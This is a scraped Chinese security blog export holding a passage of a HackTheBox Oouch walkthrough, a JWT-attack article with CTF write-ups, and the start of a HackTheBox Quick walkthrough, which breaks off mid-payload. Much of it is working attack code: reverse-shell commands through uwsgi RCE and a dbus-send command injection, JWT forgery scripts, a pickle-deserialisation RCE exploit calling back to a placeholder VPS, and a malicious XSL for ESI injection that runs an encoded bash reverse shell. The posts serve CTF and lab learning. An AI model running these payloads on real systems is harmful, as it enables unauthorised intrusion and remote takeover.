这里比较狗的是必须去掉response_type这个请求参数，才能完成重定向。原理其实上面解释过了，因为一个有效的请求必须经过手动的authorization确认才能完成重定向。如果是一个不有效的url则会在授权之前就重定向。基于此处只能发一个请求。我们只能通过一个无效response_type完成重定向。 得到cookie后更换。接下来尝试访问oauth/token https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/上面是oauth官方文档的，通过oauth/token获取一个access_token内容。我们参照格式发包即可(注意这里grant_type的值与我们初始的app不一样。所以要用之前的账户更改这一选项) 接下来用得到的access_token 访问唯一没用上的/api/get_user?access_token=xxxx.发现返回user的json信息。然后就卡住了。。。。。。这时想起来前面还提示说有获取sshkey的方法。于是把user换成ssh 拿到key后终于可以登陆这台靶机拿到user.txt了。 小结下。第一部分恐怕难度比常规的htbweb部分要难的多。因为涉及了大量新知识以及权限问题，同时网站不知道为什么经常500。不过oauth的存在也让我重新体会到了越权的许多新可能。最后的ssh总觉得有点脑洞了。 privesc to rootssh登录后先看到目录下有个提示.note.txt 1Implementing an IPS using DBus and iptables &#x3D;&#x3D; Genius? Dbus似乎是突破口。但是我的了解仅限于知道Dbus是工控里经常出现的协议。然后linpeas.sh扫一遍。发现没有什么有意思的文件。因为两个python服务都是用docker跑的。同时www-data跑着uwsgi. 这里首先问题是我们作为非root用户如何进入docker。不然有效信息实在太少了。试了很久发现可以直接用ssh登录进docker??? 当然。只有Flask的docker是可以用ssh登录的。登录进去后先看文件源码。在其中一个找到 里面提到了Dbus的interface也就是接口。名称叫做htb.oouch.Blcok。并且后面调用了Block方法。 另一边在oouch本机上找dbus相关配置。在/etc/dbus-1/system.d发现config文件 123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!-- -*- XML -*- --&gt;&lt;!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\" \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"&gt;&lt;busconfig&gt; &lt;policy user=\"root\"&gt; &lt;allow own=\"htb.oouch.Block\"/&gt; &lt;/policy&gt; &lt;policy user=\"www-data\"&gt; &lt;allow send_destination=\"htb.oouch.Block\"/&gt; &lt;allow receive_sender=\"htb.oouch.Block\"/&gt; &lt;/policy&gt;&lt;/busconfig&gt; 也就是说，root确实是可以利用dbus进行通信的。但只有www-data可以进行收发消息通信。那么下面的要务是获取www-data的权限。 这里其实并不难。因为我们之前已经发现过，www-data是跑着uwsgi的。而python的uwsgi可以触发RCE似乎在几年前的RWCTF中就出现过。(这是看CTF is awesome 中听到youtuber提到的) 所以主要就麻烦在把exp传过去。这里使用scp比较方便。因为docker容器里啥都没有.检查下socket文件位置，于是在docker的web源码处找到uwsgi.ini文件 1234567891011qtc@aeb4525789d8:/code$ cat uwsgi.ini [uwsgi]module = oouch:appuid = www-datagid = www-datamaster = trueprocesses = 10socket = /tmp/uwsgi.socketchmod-sock = 777vacuum = truedie-on-term = true https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.pyuwsgi的脚本传好运行脚本，接下来qtc处nc接受即可 1python rce.py -m unix -u &#x2F;tmp&#x2F;uwsgi.socket -c &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.18.0.1&#x2F;9001 0&gt;&amp;1&#39;&quot; 这里似乎脚本有个小问题，不过把报错的位置改下就好。 然后本来应该很快解决的www-data跟root通信问题困扰了我好久。首先传一个nc到docker里面监听，然后用刚刚docker的www-data的shell传下面这个payload 1dbus-send --system --print-reply --dest&#x3D;htb.oouch.Block htb&#x2F;oouch&#x2F;Block htb.oouch.Block.Block &quot;string:; rm &#x2F;tmp&#x2F;f ; mkfifo &#x2F;tmp&#x2F;f; cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 172.18.0.3 6666 &gt;&#x2F;tmp&#x2F;f;&quot; 按理说应该成的，结果卡了好久。为此特意上网找wp结果发现是几乎一样的payload。加上我又不懂dbus，所以就只好搁置了。结果第二天再试了下就成了……不知道是不是因为我传了个oouch自己的nc到docker里面的缘故。总之太麻烦了，所以不想再复现了。 summary这台靶机主要价值在于前面get user部分非常贴近实战。我觉得是有很高学习价值的。关于oauth的知识之后最好去了解下，对授权这块本应该属于重点的安全问题能有新的认识。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]},{"title":"Make jwt great again","slug":"Make-jwt-great-again","date":"2020-06-24T13:03:40.000Z","updated":"2021-02-18T05:09:34.127Z","comments":true,"path":"2020/06/24/Make-jwt-great-again/","link":"","permalink":"https://www.bycsec.top/2020/06/24/Make-jwt-great-again/","excerpt":"jwt，全称json-web-token.其安全问题一直以来众所周知。CTF中也经常性的会出现相关的jwt伪造的题目。但是之前在打了场NahamconCTF的比赛后，对jwt又有了全新的认识。因此在这里全面的解释下jwt的相关漏洞。Let’s make jwt great again :)","text":"jwt，全称json-web-token.其安全问题一直以来众所周知。CTF中也经常性的会出现相关的jwt伪造的题目。但是之前在打了场NahamconCTF的比赛后，对jwt又有了全新的认识。因此在这里全面的解释下jwt的相关漏洞。Let’s make jwt great again :) jwt JWT的全称 Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法 其格式也非常清晰header.payload.signature由三段式组成。 这里值得一提的是，flask的session生成格式也同样是三段式。有一定的异曲同工之处。但是不同于jwt。其伪造方式往往非常局限。 下面简单谈下三个部分结构 header一个简单的header是这种形式的1234&#123; \"alg\" : \"HS256\", \"typ\" : \"jwt\"&#125; 但是实际上jwt的header还支持加入其它几个属性。kid,jwk......其具体含义将在后面提及。 payload123456789&#123; \"user_role\" : \"finn\", //当前登录用户 \"iss\": \"admin\", //该JWT的签发者 \"iat\": 1573440582, //签发时间 \"exp\": 1573940267, //过期时间 \"nbf\": 1573440582, //该时间之前不接收处理该Token \"domain\": \"example.com\", //面向的用户 \"jti\": \"dff4214121e83057655e10bd9751d657\" //Token唯一标识&#125; 其中大部分变量都是可以选择性生成的。有的语言的jwt库会自动生成iat变量，但是这些都无伤大雅。往往最重要的，是当payload存储了自定义的敏感信息时。比如username之类的。 由于jwt存储信息时，header+payload的json数据是直接通过base64进行编码存储的。因此我们一定可以从payload中发现信息泄露。 但是从漏洞利用角度来讲，我们如果想要达成越权的目的，就必须得提到其signature部分。 Signature 顾名思义，就是通过前面指定的算法，去生成对应的sig.这里我以HS256为例，从伪代码的角度讲。是这样生成的 123key = 'secretkey' unsignedToken = encodeBase64(header) + '.' + encodeBase64(payload) signature = HMAC-SHA256(key, unsignedToken) 可见，其思路就是用HMAC-sha256（对称加密算法），对jwt前两个部分组成的字符串进行加密。 但是实际上，大家可能注意到过一个现象：jwt中没有/,=这种本该出现在base64数据中的字符。而在之前提到过的比赛中，我也是遇到了这个问题，并通过找规律发现，jwt最终的结果会将原始的base64字符串中的/换成_。并且去掉原本base64中用于补位的=。 实际上，这点我们可以用python的库中base64.urlsafe_b64encode替换base64encode.也因此可以理解，是为了网络传输才对这几个特殊字符进行了处理。 至于另一种常见的RS256算法也是相同的道理。服务端需要存储一组publickey.pem与privatekey.pem.我们需要私钥生成token.服务端则会用公钥解密token。 exploits接下来就是如何利用漏洞渗透jwt了。首先需要明确两点 是否需要利用jwt？ 是否有其他漏洞泄露key? 之所以提到这两点是因为：jwt本身就是因为只用服务端存储一组key来减轻压力而诞生的。是可以作为sessionid的替换方案的。一般情况下，主流的编程语言python,java,Node.js都可以很轻松的调用jwt.其他语言如php也支持。而真实情况往往是他们调用jwt来存储必要的简单用户信息，所以不要认为jwt一定有漏洞可利用 同时，jwt的key也是非常头疼的一个话题。如果需要越权，那么就需要伪造token.而伪造必须需要key来签名（或者服务端脚本漏洞）。也许是受了国赛影响，jwt的key是用c-jwt-cracker暴破的.而实际情况下，key很有可能难以爆破，所以我认为最佳方案是先去寻找可能泄露key的方法。 比如某比赛我在getshell后，扒下源码时顺手看了一眼它服务端的key，根本不可能爆破 所以，尝试其他方式来获取key。这也正是我下面要总结的，用于jwt的漏洞利用。 信息泄露-伪造必备网站：http://jwt.io/这也是所有jwt题目第一步就该做的。因为即使没有key，我们也能清晰的得到所有header与payload的信息。而往往这决定了我们下一步的举措。 比如，payload中有username字段。那么我们是否可以伪造admin来进行权限提升呢？或者，应用有某个变量字段取自jwt,那么我们如果有了key.就可以使用jwt.io或者python脚本进行伪造了。 以今年网鼎玄武组的js_on为例。当以弱口令登录admin时，就可以得到key。从而任意改造存在sql注入的字段进行盲注。这也就要求我们使用脚本来完成攻击。下面给出一个python调用jwt基本用法 1234import jwtencoded_jwt = jwt.encode(&#123;'user_name': 'admin'&#125;, 'secretkey', algorithm='HS256').decode('utf-8')print(encoded_jwt) 注意python调用jwt的库是PyJwt。并且还有一个坑点是，python想要用私钥作为key，也就是使用RS256算法加密时会报错。不知道是否只有我出现这个问题。因此还是得用jwt.io解决 None-algorithmjwt支持空算法，也就是None。原本只是为了调试用的，但这一旦出现在了源码中将是非常致命的。 比如之前虎符比赛的题目。应该是借鉴了外国赛的一个题。其源码是这样的 123456let sid = JSON.parse(Buffer.from(cookie.split(\".\")[1], 'base64').toString()).secretid;if(sid==undefined||sid&gt;=secrets.length||sid&lt;0)&#123;throw \"invalid sid\"&#125;let decoded = jwt.verify(cookie, secrets[sid]);if(decoded.perms==\"admin\")&#123; res.locals.flag = true;&#125; 可以发现，当没有强调算法，直接使用jwt.verify()时，由于key可控，jwt是可以用None算法来解token的。这也就导致了简单的越权。同理。python的源码如果没有强调，也是存在空算法伪造的。所以有时候不妨尝试一下，看看无算法能不能通过服务端校验（没有源码时） 通常步骤如下 1234567import jwtjwtToken= 'eyJhbGciOiJIUzI1NiIsI...'decodedToken= jwt.decode(jwtToken, verify=False) # Need to decode the token before encoding with type 'None'noneEncoded= jwt.encode(decodedToken, key='', algorithm=None)print(noneEncoded.decode()) RS256 to HS256从非对称到对称算法的伪造。其实非常有意思但是国内CTF都没怎么见到过。 直接上真题源码，应该是之前HSCTF里面的 12345#生成tokenauth = jwt.encode(&#123;\"auth\": \"guest\"&#125;, PRIVATE_KEY, algorithm=\"RS256\")#用token验证身份是否为adminadmin = jwt.decode(auth, PUBLIC_KEY)[\"auth\"] == \"admin\" 乍一看没什么漏洞。但是如果了解jwt，就会发现这里可能存在使用HS256替换RS256的风险。假如公钥泄露，我们就能用公钥作为key，使用HS256生成token通过校验。这同样是没有强调算法的问题。 伪造的话可以用python 1234import jwtpublic = open('public.pem', 'r').read()print(public)print(jwt.encode(&#123;\"data\":\"test\"&#125;, key=public, algorithm='HS256')).decode('utf-8') 但需要注意，这里必须满足pyjwt==0.4.3才能伪造。否则只能采用其他办法了。这里直接给出payloadallthethings里的链接https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature—rs256-to-hs256 而Node.js也存在这种风险。所以说jwt的安全问题主要出在开发者源码写的不够好的原因。 jku/jwk以上都是相对比较常见的漏洞了。甚至国内ctf还只出现过前两种。而Nahamcon的比赛让我了解到了另一种存在的漏洞。与jku相关。 JKU全称是“JWKSet URL”，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。若允许使用该字段且不设置限定条件，攻击者就能托管自己的密钥文件，并指定应用程序，用它来认证token。 而jwk就是json web key。 实际上你能发现amazon就有相关的文档来了解jku。https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html 其中还提到了kid这个header选项。它的作用是获取对应的字段作为key。(jwk类型) 下面我用比赛中flagjokes这题来讲解下： 首先解出jwt header如下，而我们只要payload中的username为admin即可获得flag。 12345&#123; &quot;alg&quot;: &quot;RS256&quot;, &quot;jku&quot;: &quot;http:&#x2F;&#x2F;localhost:5000&#x2F;static&#x2F;jwks.json&quot;, &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;&#125; jku指向了本地的网页。那么尝试直接访问发现网页存在static/jwks.json 123456789101112&#123; &quot;keys&quot;: [ &#123; &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;, &quot;kty&quot;: &quot;RSA&quot;, &quot;n&quot;: &quot;1bVdpTILcGSahuOL6IJCbUpDZTGFHc8lzQORNLQBXDiRd1cC1k5cG41iR1TYh74cp8HYmoLXy4U2bp7GUFm0ip_qzCxcabUwWCxF07TGsmiFmCUbcQ6vbJvnSZSZGe-RFPgHxrVzHgQzepNIY2TmjgXyqt8HNuKBJQ6NoTviyxZUqy65KtSBfLYh5XzFn3FPemOla8kGBu7moSbUpgO1t3m3LgxBV5y51E1xSSoC7nAYPFrQ9wOTHEh7kGxGUQqKtGswyi2ncH22VcfQkxMA0HerFMPOr2n9eEZEbeJFco9Gp3drAYDCyj0QbkJKGdbl_50cimZ7eXgeyc3lEEXL7Q&quot;&#125; ]&#125; 此时我发现得到jwk后，即可生成公钥了。但是网站只泄露了公钥，那么根据上面总结的，能尝试的只能是HS256替换RS256生成token.然而当时尝试了后却得到服务端的报错。也就是说并不能更换算法来伪造token.那么怎么办呢？ 此时通过查询一系列资料，终于发现jku的指定是有洞的。假如我们让它加载到我们自己的jwk.json，我们就能够以RS256算法而不是伪造HS256通过校验了。 所以，正确思路是申请一组key，kid可以自定https://mkjwk.org/我们可以只放中间的作为jwk.json，也可以把右边的公钥改成jwk的格式。 之后就是在线或者用脚本进行jwk-&gt;pem的转换了。这里贴出一个Node.js进行转换的脚本。 12345678910111213const jose = require('node-jose');const fs = require('fs');const args = process.argv.slice(2);const key = fs.readFileSync(args[0]);var DUMP_PRIVATE_KEY = ('true' == args[1]);jose.JWK.asKey(key) .then(function(key) &#123; console.log(key.toPEM(DUMP_PRIVATE_KEY)); &#125;); 使用时 发现node test.js private.jwk跟 public.jwk一致，证明没有问题。此时只需使用node test.js private.jwk TRUE即可输出私钥结果，否则脚本设计上是默认不输出私钥的（危险）。 因此。本题关键是更改jku获取到我们自己的json。这样我们可以用私钥加密payload.服务端用获取到的公钥解密payload. kid-任意文件kid的含义上面已经提到过了：指定jwt的密钥。 kid可能存在的问题，在了解了上面jku的相关漏洞后，应该会比较清楚了。如果jwt是通过header中的kid来获取key，那么就可能造成任意文件读取（不一定有回显） 简单的情况下，我们可以直接指定kid为2，即HS256的secretkey为2 12345&#123; \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"2\"&#125; 或者有的时候它是从文件获取的 1&quot;kid&quot; : &quot;&#x2F;etc&#x2F;passwd&quot; 假如有web应用把密钥回显出来（不太可能），即可读取文件。同时还有一种思路。由于可以指定任意文件，只要找到可控的key。我们就能做到伪造jwttoken。 比如指定静态css文件，它的文件内容一定是可控的，且易于从网页获取的。 1&quot;kid&quot; : &quot;&#x2F;css&#x2F;public.css&quot; 下面就NahamconCTF的B’omarr Style来分析下这题因为花了我不少时间。但是仍然学到了非常多东西，所以特地写下。赛后我也一时兴起写了篇英文wp投CTFTime上了https://hackmd.io/@byc404/B1VBX8Qp8下面我相当于补一份中文wp: 首先是题目注册，登录后的token 重点同样在于jwt的header 12345&#123; &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;, &quot;kid&quot;: &quot;secret.txt&quot;&#125; 从header信息中。我们可以推断出，jwt的key是从secret.txt这个文件中获取的。 但是非常奇怪的是，在没有key的情况下,jwt.io解出来的payload内容为空。 这里可能就需要一点眼力了，因为自己做过好几道pickle相关的序列化题，所以这里不难直接看出，jwt的payload部分被替换成了pickle生成的序列化base64内容。或者我们也可以单独拿出这一段奇怪的base64用xxd看 能够明显看到c_mamin,username等字样。这就是典型的python opcode的内容 所以这里我明确了题目的要求：伪造一个有效token,包含我们恶意的python序列化内容，进行RCE。 然而这只是第一步。接下来我们会发现，secret.txt内容未知，而想要获取key并没有其他途径。那么首先我先尝试None算法试试吧。 尝试后发现只接受HS256.看来重点是，寻找到一个可控的key。 此处的kid表示我们可以指定任意文件作为密钥，但这也是一大难点。因为此题是python环境，其静态文件基本没有可控的。它的html格式是典型的直接从cdn获取css的而html文件虽然我们能直接获取，但是别忘了这大概率是flask起的web应用。也就是说，我们就算能指定templates/index.html作为key，html中是包含有jinja2的模板语句的，这一部分代码我们也是无法控制的。这里放出扒下来的html 所以说，静态文件这条路是走不通的。看来只能尝试系统文件了。 但这里我想大部分人都没想过，linux的系统文件中有什么是内容可控的？这其实也是一个有趣的地方。常见如/etc/passwd，/etc/hosts等等都是无法预测的。而/proc/self等等也许存在空文件但是不能百分之百确定。有没有什么内容是百分之百能够确定的呢？ 有。答案就是/dev/null 我们都知道linux将垃圾内容扔进/dev/null是常见操作。而我们通常是echo log &gt; /dev/null 2&gt;&amp;1来完成一次没有任何回显的直接操作。/dev/null能够丢弃一切写入其中的数据。而读取它将立即得到一个EOF。 所以说，如果我们控制kid读取/dev/null为key.此时我们直接使用空字符串作为HS256的secretkey就能得到一个有效的key. 12345678910import jwtheaders=&#123; \"typ\": \"JWT\", \"alg\": \"HS256\", \"kid\": \"/dev/null\"&#125;payload=&#123;&#125;token=jwt.encode(payload,'',algorithm=\"HS256\",headers=headers).decode('utf-8')print(token) 通过上面的脚本，我发现更换cookie时得到的报错回显不再是Invalid Signature，而是Invalid load key这其实是一个好消息，因为经过搜索后这是一个pickle的报错。也就是说我们已经通过校验了，只要剩下的payload部分是有效的picklebase64数据即可。 然而仔细一想发现问题不对。jwt作为json web token，有效的传输数据都应该是json数据。但这里居然直接把pickle的opcodebase64后放在了payload部分。这让当时的我无法理解。这也就意味着：payload的原始内容在python中不是一个字典，也就是说我们无法直接通过pyjwt库进行密文生成。 于是我去找资料。发现其实jwt的HS256签名是hmac-sha256生成的。其中key是jwt的secretkey.data是base64(header).base64(payload)整体 所以我们可以使用脚本手动拼接。下面直接给出完整的exp 123456789101112131415161718192021222324import pickleimport osimport base64from hashlib import sha256import hmacclass exp(object): def __reduce__(self): s = \"\"\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"VPSIP\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \"\"\" return (os.system, (s,))e = exp()payload=base64.urlsafe_b64encode(pickle.dumps(e)).decode('utf-8')#print(payload)key = \"\".encode('utf-8')data =(\"eyJraWQiOiIvZGV2L251bGwiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\"+payload).encode('utf-8')#print(data)signature = base64.urlsafe_b64encode(hmac.new(key,data,digestmod=sha256).digest())#print(signature)print(data.decode()+'.'+signature.decode().rstrip('=')) 解释几点1.payload部分pickle与cPickle都可以。但是这里是python3环境，还是得用python3生成。 2.注意我使用了base64.urlsafe_b64encode而不是base64encode。这点上面也讲过了，jwt中不会出现/和=这样的字符的。比赛中我并没有去详细查询，而是直接手动将/替换成_并去掉=同样得到了有效的key. 3.这里生成pickle的payload我也同样做了点手脚：在弹shell的代码后加了几个空格。原因同上，因为payload部分同样不允许=这样的字符。所以可以手动加空格防止出现=. 4.弹shell只可能使用python或bash反弹shell.因为这个靶机真的啥都没有（curl,wget,nc）。当然如果渗透linux靶机做多了也能发现python弹shell真的万金油。没有用bash纯粹是因为搞忘了:( 5.最后wp放出来后有网友说直接照搬我的exp服务端会报错module &#39;nt&#39; not found。我试了下发现居然真的有这个问题。但是比赛时我是用vps上的python3.5生成的payload,经测试还是可以成功RCE。而换到本机上的python3.7就出错了。最后对比payload发现两者生成的签名不一致，这里我只能推断是加密算法的问题。毕竟本机上的pycrypto我一直没弄好过。 最后成功弹shell. 小结jwt安全的相关漏洞我认为基本上就只有以上这些了。因为其实其他相关的洞或多或少都与此相关。只要掌握了这些常见可利用的点，并且了解一下算法的流程，即使碰到最后一道题这种变通性极强的也能顺着思路走下去","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"hackthebox-Quick-一次艰难的渗透","slug":"hackthebox-Quick-一次艰难的渗透","date":"2020-06-23T08:13:39.000Z","updated":"2021-02-18T05:09:22.348Z","comments":true,"path":"2020/06/23/hackthebox-Quick-一次艰难的渗透/","link":"","permalink":"https://www.bycsec.top/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/","excerpt":"因为现在还没有接到确切通知说是否考试,原本期末复习的计划也被打乱了。既然现在复习觉得有点亏，于是干脆去做做hackthebox的靶机算了，正好好久没写wp了2333。 虽然没更新文章，但是其实自己每周都在跟着ippsec的视频做退役靶机。当然其实也做了5.6台现役的。不过今天要写的Quick靶机的wp是自己头一次独立完成的困难难度的靶机。真的真的学到了很多东西。所以一定要记录下。 另外由于Quick还是active状态，所以我会给文章上锁直到靶机退役。","text":"因为现在还没有接到确切通知说是否考试,原本期末复习的计划也被打乱了。既然现在复习觉得有点亏，于是干脆去做做hackthebox的靶机算了，正好好久没写wp了2333。 虽然没更新文章，但是其实自己每周都在跟着ippsec的视频做退役靶机。当然其实也做了5.6台现役的。不过今天要写的Quick靶机的wp是自己头一次独立完成的困难难度的靶机。真的真的学到了很多东西。所以一定要记录下。 另外由于Quick还是active状态，所以我会给文章上锁直到靶机退役。 靶机ip: 10.10.10.186 攻击机: 10.10.14.40 initial foothold这一部分真的挺麻烦的……中间有点点脑洞的成分,但总体还是比较符合真实环境的。 首先必然是nmap端口扫描。 1234567891011121314151617# Nmap 7.80 scan initiated Thu Jun 18 14:43:20 2020 as: nmap -sC -sV -oA nmap/quick 10.10.10.186Nmap scan report for 10.10.10.186Host is up (0.44s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)| 256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)|_ 256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)9001/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Quick | Broadband ServicesService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Jun 18 14:46:54 2020 -- 1 IP address (1 host up) scanned in 214.65 seconds 可以看到只开放了ssh跟9001web端口。尝试访问web页面会发现主要信息有 几个标出了姓名跟公司的留言 update处指向了一个网页https://portal.quick.htb 同时底部clients定向到clients.php 似乎里面的公司跟前面的人名备注的公司有相同的地方。目前只能说大致可以收集一些信息。访问login.php发现需要用户名跟密码。不过，此处的用户名要求为邮箱登录。密码则没有什么透露的信息。 web页面的信息收集完了，就应该试试https://portal.quick.htb了 然而奇怪的是,我们根本没有办法访问这个网页(在修改了/etc/hosts的前提下)。尝试直接curl也同样无果。这时直接陷入僵局。 在逛了一圈htb的论坛后，发现大家提到了重新build工具这个关键信息。并且提到了，如果访问不了这个页面，是因为浏览器无法理解收到的信息。所以访问不了。并且最好尝试其他protocol. 在留意到protocol这个关键词后，我开始尝试跑一遍udp端口的nmap 12345678# Nmap 7.80 scan initiated Fri Jun 19 20:33:51 2020 as: nmap -sU -oA nmap/quick-udp 10.10.10.186Nmap scan report for portal.quick.htb (10.10.10.186)Host is up (0.43s latency).Not shown: 999 closed portsPORT STATE SERVICE443/udp open|filtered https# Nmap done at Fri Jun 19 20:50:40 2020 -- 1 IP address (1 host up) scanned in 1008.38 seconds 原来在udp的443端口有https服务。看来大概率就是我们之前的网站了。此时搜索相关信息，会发现这应该是HTTP/3协议。因为HTTP/3的一个重要特征就是将弃用TCP协议，改为使用基于UDP协议的QUIC协议实现。可以看下维基跟这篇文章。http3-in-curl http/3协议虽然是新趋势，但是目前能唯一有效连接的工具还是只有curl.所以我猜测论坛里大家提到的就是重新编译curl以支持http3. 然而这一步十分耗时间，因为必须要下Quiche重新编译，下brew来进行包管理……总之我连brew都没下完就放弃了这个选择，因为国内实在太慢了，换了git源后又因为其他源继续龟速下载…这时我在搜索内容中注意到docker有现成的镜像。于是果断换docker进行curl。(docker的最大价值就是为我们节省了配环境的大把时间)pull一个ymuski/curl-http3镜像 1docker run -it --rm ymuski/curl-http3 curl -V 检查下支持http3.这样就可以用--http3来访问网址了 1docker run -it --rm ymuski/curl-http3 curl https://10.10.10.186 --http3 发现几个链接。一个个访问后发现docs文档有两个pdf。 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;&lt;h1&gt;Quick | References&lt;/h1&gt;&lt;ul&gt; &lt;li&gt;&lt;a href=\"docs/QuickStart.pdf\"&gt;Quick-Start Guide&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"docs/Connectivity.pdf\"&gt;Connectivity Guide&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/head&gt;&lt;/html&gt; 开始果断尝试直接-o输出，但是却搞忘了，这里是调用的docker执行命令。那么我们的输出在镜像里面。所以我得挂载一个目录来获取输出的pdf 1docker run -it --rm -v /mnt/curl:/tmp ymuski/curl-http3 curl 10.10.10.186 --http3 -o /tmp/xxx.pdf 在其中一个pdf中得到关键信息。也就是密码。 那么接下来就是尝试登录了。这也是起手式这里又一个难点。原先htb的邮箱基本上都是admin@{box的hostname}.htb这种形式的。但是此处常规尝试都不起效果。于是只能手动写脚本组合下之前的信息。 123456789101112131415161718192021222324252627282930313233343536list=[]users=['tim','roy','elisa','james','mike','jane','john']postfix=['qconsulting.co.uk','darkwing.com','wink.co.uk','lazycoop.cn','scoobydoo.it','penguincrop.fr']postfix2=['qconsulting.co.uk','darkwing.com','wink.co.uk','lazycoop.com.cn','scoobydoo.co.it','penguincrop.co.fr']postfix3=['qconsulting.htb.uk','darkwing.htb','wink.htb.uk','lazycoop.htb.cn','scoobydoo.htb.it','penguincrop.htb.fr']def quick(): global list for i in users: for j in postfix: list.append(i+'@'+j) return listdef quick2(): global list for i in users: for j in postfix2: list.append(i+'@'+j) return listdef quick3(): global list for i in users: for j in postfix3: list.append(i+'@'+j) return listf=open('creds.txt','w')for email in quick(): f.write(email+'\\n')for email in quick2(): f.write(email+'\\n')for email in quick3(): f.write(email+'\\n')f.close() 最后尝试出结果后才发现其实不需要过多尝试的。但是重点(难点)就在于，它的邮箱格式非常类似真实的企业邮箱。前面我们主页面的信息结合起来后，其实每个人名对应的公司，国家都是确定的。所以我们主要注意采用二级域名即可。也就是跟在公司名后的.co.fr,.co.it等等。 得到用户elisa成功登陆后,我们就要准备第三部分的利用了。这里我直觉猜测应该可以RCE,因为htb的靶机如果没法getshell的话连后面的提权都做不到。出于直觉以及最早的信息收集，我认为这里应该是从header中泄露的信息下手 注意到X-Powered-By: Esigate后直接搜索相关信息。了解到这是一个模板相关的java服务。可以起到搭配phpcms并且将html片段进行整合的作用。并且进一步了解后发现存在RCE漏洞。 找了好几篇文章都没有关键代码。只有这篇提到了https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/ 触发的payload如下，显然也是因为引入了外部的恶意xsl导致RCE。 12&lt;esi:include src=\"http://website.com/\" stylesheet=\"http://evil.com/esi.xsl\"&gt;&lt;/esi:include&gt; 这里我注意到前面的src是website.com所以我在使用自己的payload时将其改为了10.10.10.186:9001。后来也证明如果不改的话，触发时会出现error retrieving url的报错。 接下来则是尝试如何触发的问题。这里我按打CTF的直觉认为应该是ticket.php传payload.search.php传search参数进行触发。当然网页也提醒了，当你传完ticket后会返回一个预先置好的ticketid。只要在search.php搜索对应id即可。 这里还有一个小坑。那就是java的命令执行问题。开始尝试触发时发现主要问题是： 一个ticket传一次后就失效了。导致我每次得更改xsl的名字。 命令执行curl 10.10.10.14.40|bash失败。估计又是java的锅。 如果稍微过一遍上面那篇文章中的xsl.会发现肯定是调用了java.lang.Runtime.getRuntime().exec()来执行命令的。所以肯定存在单条命令特殊字符过不去的问题。当然解决方法在做vulhub各种java反序列化时就用烂了。使用编码绕过即可。http://jackson-t.ca/runtime-exec-payloads.html 最后我的xsl payload 123456789101112131415&lt;?xml version=\"1.0\" ?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:output method=\"xml\" omit-xml-declaration=\"yes\"/&gt;&lt;xsl:template match=\"/\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"&gt;&lt;root&gt;&lt;xsl:variable name=\"cmd\"&gt;&lt;![CDATA[bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MC85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;]]&gt;&lt;/xsl:variable&gt;&lt;xsl:variable name=\"rtObj\" select=\"rt:getRuntime()\"/&gt;&lt;xsl:variable name=\"process\" select=\"rt:exec($rtObj, 